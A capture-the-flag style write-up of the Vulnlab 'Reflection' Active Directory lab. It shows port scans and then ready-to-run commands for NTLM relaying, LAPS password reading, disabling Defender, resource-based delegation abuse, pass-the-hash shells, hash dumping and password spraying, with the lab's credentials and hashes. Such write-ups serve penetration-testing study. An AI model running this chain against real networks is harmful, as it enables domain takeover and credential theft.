# Vulnlab - Reflection

# NMAP

## DC01.reflection.vl

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-08-13 18:24:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                             
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                     
445/tcp   open  microsoft-ds? syn-ack ttl 127 
464/tcp   open  kpasswd5?     syn-ack ttl 127    
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                               
636/tcp   open  tcpwrapped    syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM                      
|_ssl-date: 2023-08-13T18:26:16+00:00; -1s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)                     
3269/tcp  open  tcpwrapped    syn-ack ttl 127    
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62571/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows   
 ```

## MS01.reflection.vl

```bash
Host is up, received echo-reply ttl 127 (0.21s latency). 
Scanned at 2023-08-13 21:52:56 PKT for 264s
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE    REASON          VERSION
135/tcp   open  tcpwrapped syn-ack ttl 127
445/tcp   open  tcpwrapped syn-ack ttl 127
3389/tcp  open  tcpwrapped syn-ack ttl 127
|_ssl-date: 2023-08-13T16:57:16+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=ms01.reflection.vl
5985/tcp open  tcpwrapped syn-ack ttl 127
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM                       
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback 
| Issuer: commonName=SSL_Self_Signed_Fallback              
| Public Key type: rsa                         
| Public Key bits: 2048                              
```

## WS01.reflection.vl

```bash
Host is up, received echo-reply ttl 127 (0.22s latency). 
Scanned at 2023-08-13 21:52:56 PKT for 264s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON          VERSION
135/tcp  open  tcpwrapped syn-ack ttl 127
445/tcp  open  tcpwrapped syn-ack ttl 127
3389/tcp open  tcpwrapped syn-ack ttl 127
| ssl-cert: Subject: commonName=ws01.reflection.vl
```

## PORT 445 (SMB)

Enumerating the smb shares from the machines, we only get list of shares with null authentication on `MS01`

<img src="https://i.imgur.com/8xMhHye.png"/>
Accessing `staging` share we'll get `staging_db.conf` file having credentials

<img src="https://i.imgur.com/YNPGHmu.png"/>
With `crackmapexec` we can try to authenticate on smb to verify if these are valid credentials

```bash
cme smb hosts.txt -u 'web_staging' -p 'Washroom510'
```

<img src="https://i.imgur.com/rWFuxzH.png"/>

We can try authenticating over MSSQL as that service is running on DC01 and MS01

```bash
cme mssql hosts.txt -u 'web_staging' -p 'Washroom510' --local-auth
```

<img src="https://i.imgur.com/DLy7GsO.png"/>

We get a vaild login so we can proceed with using `mssqlclient.py` from impacket

```bash
mssqlclient.py web_staging:'Washroom510'@10.10.173.134
```

<img src="https://i.imgur.com/qrWt5us.png"/>

Since `xp_cmdshell` was not allowed for this user

<img src="https://i.imgur.com/uP6wZrX.png"/>

We can try using `xp_dirtree` to coerce the server to our machine in order to retrieve NTLMv2 hash of service account of mssql

<img src="https://i.imgur.com/sTvRfHF.png"/>

But cracking this hash didn't worked as well

<img src="https://i.imgur.com/a9TPMMj.png"/>
So we can't crack this hash, maybe we can relay as smb signing is disabled

<img src="https://i.imgur.com/43PzJLZ.png"/>

With `ntlmrelayx.py` we can realy the hash and authenticate 

<img src="https://i.imgur.com/Yxgpz6y.png"/>

 It shows that relaying on smb worked, we can also try to relay it on mssql running on DC01 which will allow us to execute queries as `svc_web_staging` 

```bash
ntlmrelayx.py -t mssql://10.10.173.133 -smb2support --query 'SELECT @@version'
```

<img src="https://i.imgur.com/9rMODWJ.png"/>

We can enumerate the databases, as here's there's one called `prod`

```bash
ntlmrelayx.py -t mssql://10.10.132.133 -smb2support --query 'SELECT name FROM master.dbo.sysdatabases;'
```

<img src="https://i.imgur.com/GeXbWIO.png"/>
But listing the tables in that database didn't worked as this user doesn't have access , trying to enable xp_cmdshell didn't worked here as well

<img src="https://i.imgur.com/itM1R9d.png"/>

So there was nothing we could do from here but as saw previously that svc_web_staging was able to authenticate smb we can list shares and try to access shares from DC01, for this we need to use socks proxy as it's going to keep the smb connection open and also lists the relays which were successful

<img src="https://i.imgur.com/DfLciSK.png"/>

```bash
ntlmrelayx.py -tf hosts.txt -smb2support -socks
```

<img src="https://i.imgur.com/8q4en3E.png"/>

It does show that this user is not an admin but still we can access the smb shares as a domain user with `smbclient`

<img src="https://i.imgur.com/HUVWjdF.png"/>

To my surprise this didn't worked and I don't know the reason, maybe it's an issue with my version of smbclient but with smbclient.py from impacket worked like a charm


```bash
proxychains smbclient.py reflection/svc_web_staging@10.10.132.133
```

<img src="https://i.imgur.com/cTN54tF.png"/>

From `prod` share we can grab `prod_db.conf`

<img src="https://i.imgur.com/g1G966K.png"/>'

<img src="https://i.imgur.com/Vqjk7pJ.png"/>

Having the  credentials for the production,  we can enumerate the database

```powershell
mssqlclient.py web_prod:Tribesman201@10.10.132.133
```

<img src="https://i.imgur.com/vPx1fG0.png"/>

From the `users` table we'll get set of two credentials

<img src="https://i.imgur.com/A8HrHVI.png"/>

On verifying these credentials, both of them are domain users

<img src="https://i.imgur.com/23Yb5Oi.png"/>
So now we can enumerate the domain with `bloodhound` , before doing that make sure to edit the hosts file for dc01.reflection.vl entry

<img src="https://i.imgur.com/g3Mm48X.png"/>

```bash
python3 /opt/BloodHound.py-Kerberos/bloodhound.py -d 'reflection.vl' -u 'abbie.smith' -p 'CMe1x+nlRaaWEw' -ns 10.10.132.133 -c all
```

<img src="https://i.imgur.com/DzFWVpG.png"/>

From bloodhound we see these two users are part of Staff group

<img src="https://i.imgur.com/Vm1tLj1.png"/>
<img src="https://i.imgur.com/AypaT2t.png"/>
But Staff group didn't had any ACLs, abbie had `GenericAll` on `MS01`

<img src="https://i.imgur.com/6xxGOQN.png"/>

Unfortunately we can't just add a computer object as there's 0 machine quota

<img src="https://i.imgur.com/BqeYivn.png"/>

However, since we have GenericAll, we can read LAPS on MS01 which is a randomized password for local administrator 

```bash
cme smb 10.10.132.134 -u 'abbie.smith' -p 'CMe1x+nlRaaWEw' --laps
```

<img src="https://i.imgur.com/S7Y8SQi.png"/>

```bash
evil-winrm -i 10.10.132.134 -u 'administrator' -p 'H447.++h6g5}xi'
```

<img src="https://i.imgur.com/ZyWKUjF.png"/>

Disabling the defender with `Set-MpPreference -DisableRealtimeMonitoring $true`

<img src="https://i.imgur.com/1UmVb5L.png"/>

Uploading netcat and getting a shell again as evil-winrm was causing an issue with mimikatz

<img src="https://i.imgur.com/6YVPhIz.png"/>

From the cache, we see `Georgia.Price`

<img src="https://i.imgur.com/1dHedue.png"/>

With `vault::cred /patch` we can list the credentials from the credential vault

<img src="https://i.imgur.com/6UwkZM1.png"/>

Going back to bloodhound, this user also has `GenericAll` on `WS01`

<img src="https://i.imgur.com/xifwMRO.png"/>

We know that there's no machine quota available but we do have access to MS01, we can add that machine in WS01's `msDS-AllowedToActOnBehalfOfOtherIdentity` property, for this we need to get the NThash of MS01

<img src="https://i.imgur.com/9OjTlkp.png"/>
Editing the `msDS-AllowedToActOnBehalfOfOtherIdentity` with `rbcd.py` from impacket

```bash
rbcd.py -action write -delegate-to "WS01$" -delegate-from "MS01$" -dc-ip 10.10.188.197 "Reflection/Georgia.Price:DBl+5MPkpJg5id"
```

<img src="https://i.imgur.com/nyQJnGE.png"/>

After adding the property, we can impersonate the administrator ticket on WS01 with `getST.py`

```bash
getST.py -spn 'cifs/WS01.reflection.vl' -impersonate Administrator -dc-ip 10.10.188.197 'Reflection/MS01$' -hashes ':6e77d4ac157a47c5581681b8f865677e'
```

<img src="https://i.imgur.com/0yqjKCA.png"/>

<img src="https://i.imgur.com/kaZrA7Q.png"/>

And now we can dump hashes from WS01

```bash
 secretsdump.py administrator@WS01.reflection.vl -k -no-pass
```

<img src="https://i.imgur.com/ilagr5H.png"/>
Since defender was enable on WS01 we couldn't get a shell through psexec.py

<img src="https://i.imgur.com/9AE3MTs.png"/>

We can however use  `atexec.py` to schedule the commands to be executed in order disable defender

<img src="https://i.imgur.com/s34Eutm.png"/>

```bash
atexec.py ws01/administrator@10.10.188.199 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"' -hashes ':a29542cb2707bf6d6c1d2c9311b0ff02'
```

<img src="https://i.imgur.com/eqeH3Op.png"/>
After this, we'll be able to use psexec to get a shell

```bash
psexec.py administrator@WS01.reflection.vl -hashes ':a29542cb2707bf6d6c1d2c9311b0ff02'
```

<img src="https://i.imgur.com/dM52Led.png"/>

As we already dumped hashes, we have Rhys.Garner's password who is a local admin on WS01, this user didn't had any ACLs on any object, checking the domain admins, there are 2 domain admins

<img src="https://i.imgur.com/glE9M4b.png"/>

We can try spraying the password on them to see if we can get access to those users

<img src="https://i.imgur.com/szM2Mt9.png"/>

Which worked on `DOM_RGARNER`, with this we can login on DC01 through winrm and become domain admin

<img src="https://i.imgur.com/mo2lYZR.png"/>

# References

- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
- https://tools.thehacker.recipes/impacket/examples/atexec.py
